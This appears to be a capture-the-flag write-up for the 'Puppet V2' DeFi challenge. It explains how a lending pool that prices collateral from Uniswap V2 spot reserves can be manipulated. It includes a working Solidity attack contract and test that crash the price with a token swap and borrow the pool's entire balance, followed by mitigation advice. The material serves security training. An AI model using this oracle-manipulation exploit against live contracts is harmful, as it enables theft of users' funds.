# Puppet V2

The developers of the [previous pool](https://damnvulnerabledefi.xyz/challenges/puppet/) seem to have learned the lesson. And released a new version.

Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. Shouldn't that be enough?

You start with 20 ETH and 10000 DVT tokens in balance. The pool has a million DVT tokens in balance at risk!

Save all funds from the pool, depositing them into the designated recovery account.

# Puppet V2 Challenge - Vulnerability Report

## Overview
The Puppet V2 challenge involves a lending pool that allows users to borrow Damn Valuable Tokens (DVTs) by depositing WETH as collateral. The pool uses a Uniswap V2 exchange as a price oracle to determine the required collateral amount. Despite using Uniswap V2 and its recommended utility libraries, the pool remains vulnerable to price manipulation.

## Vulnerability Details

### Severity: Critical
- Impact: High (Loss of all pool funds)
- Likelihood: High (Easy to execute)
- CVSS Score: 9.0

### Root Cause
The vulnerability stems from the lending pool's reliance on the Uniswap V2 exchange as a price oracle. The pool calculates the required collateral using the following formula in `calculateDepositOfWETHRequired()`:

```solidity
function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
    uint256 depositFactor = 3;
    return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
}

function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

The key issues are:

1. **Manipulable Price Oracle**: The price is calculated directly from the Uniswap V2 pool's reserves without any time-weighted average or other protection mechanisms.

2. **No Slippage Protection**: The pool doesn't implement any slippage protection or minimum liquidity requirements.

3. **Single Source of Truth**: The pool relies solely on the Uniswap V2 pool's reserves for price determination.

## Attack Vector

An attacker can exploit this vulnerability by:

1. Using their initial DVT balance (10,000 DVT) to manipulate the Uniswap V2 pool's reserves
2. Swapping a large amount of DVT for WETH in the Uniswap V2 pool
3. This drastically changes the price ratio in the pool
4. The lending pool's price oracle will now return a much lower price
5. The attacker can then borrow all tokens from the lending pool with minimal WETH collateral

## Proof of Concept

```solidity
contract PuppetV2Attack {
    IUniswapV2Router02 public immutable uniswapV2Router;
    PuppetV2Pool public immutable lendingPool;
    DamnValuableToken public immutable token;
    WETH public immutable weth;
    address public immutable recovery;

    constructor(
        address _uniswapV2Router,
        address _lendingPool,
        address _token,
        address _weth,
        address _recovery
    ) {
        uniswapV2Router = IUniswapV2Router02(_uniswapV2Router);
        lendingPool = PuppetV2Pool(_lendingPool);
        token = DamnValuableToken(_token);
        weth = WETH(payable(_weth));
        recovery = _recovery;
    }

    function attack() external payable {
        // 1. Wrap ETH to WETH
        weth.deposit{value: msg.value}();

        // 2. Approve Uniswap V2 Router to spend our tokens
        token.approve(address(uniswapV2Router), token.balanceOf(address(this)));
        weth.approve(address(uniswapV2Router), weth.balanceOf(address(this)));

        // 3. Swap all our DVT tokens for WETH
        // This will drastically change the price ratio in the pool
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        
        uniswapV2Router.swapExactTokensForTokens(
            token.balanceOf(address(this)),
            1, // min amount out (we don't care about slippage)
            path,
            address(this),
            block.timestamp * 2
        );

        // 4. Now the price oracle will return a much lower price
        // We can borrow all tokens from the lending pool with minimal WETH
        uint256 borrowAmount = token.balanceOf(address(lendingPool));
        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(borrowAmount);

        // 5. Approve lending pool to spend our WETH
        weth.approve(address(lendingPool), depositRequired);

        // 6. Borrow all tokens from the lending pool
        lendingPool.borrow(borrowAmount);

        // 7. Transfer all borrowed tokens to recovery address
        token.transfer(recovery, token.balanceOf(address(this)));

        // 8. Unwrap any remaining WETH and send ETH back to the player
        uint256 remainingWeth = weth.balanceOf(address(this));
        if (remainingWeth > 0) {
            weth.withdraw(remainingWeth);
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    receive() external payable {}
}
```

And the test function that executes the attack:

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // Deploy the attack contract
    PuppetV2Attack attack = new PuppetV2Attack(
        address(uniswapV2Router),
        address(lendingPool),
        address(token),
        address(weth),
        recovery
    );

    // Transfer all tokens to the attack contract
    token.transfer(address(attack), token.balanceOf(player));

    // Execute the attack
    attack.attack{value: player.balance}();
}
```

## Impact
- The attacker can drain all tokens from the lending pool (1,000,000 DVT)
- The attack requires minimal WETH collateral due to the manipulated price
- The attack can be executed in a single transaction
- The attack is more efficient than the original Puppet challenge due to Uniswap V2's improved liquidity model

## Recommendations

### Short-term Fixes
1. Implement a time-weighted average price (TWAP) oracle using Uniswap V2's built-in price accumulator
2. Add minimum liquidity requirements for the Uniswap V2 pool
3. Implement slippage protection in the price calculation
4. Add a minimum time delay between price updates

### Long-term Fixes
1. Use multiple price oracles and aggregate their results
2. Implement circuit breakers for significant price movements
3. Consider using Uniswap V3 with its concentrated liquidity and improved price oracle
4. Add a minimum holding period for borrowed tokens
5. Implement a maximum borrow amount based on pool liquidity

## References
- [Uniswap V2 Documentation](https://docs.uniswap.org/contracts/v2/overview)
- [Uniswap V2 Price Oracle](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/oracles)
- [Price Oracle Manipulation](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/#price-oracles)
- [ERC4626 Vault Standard](https://eips.ethereum.org/EIPS/eip-4626)
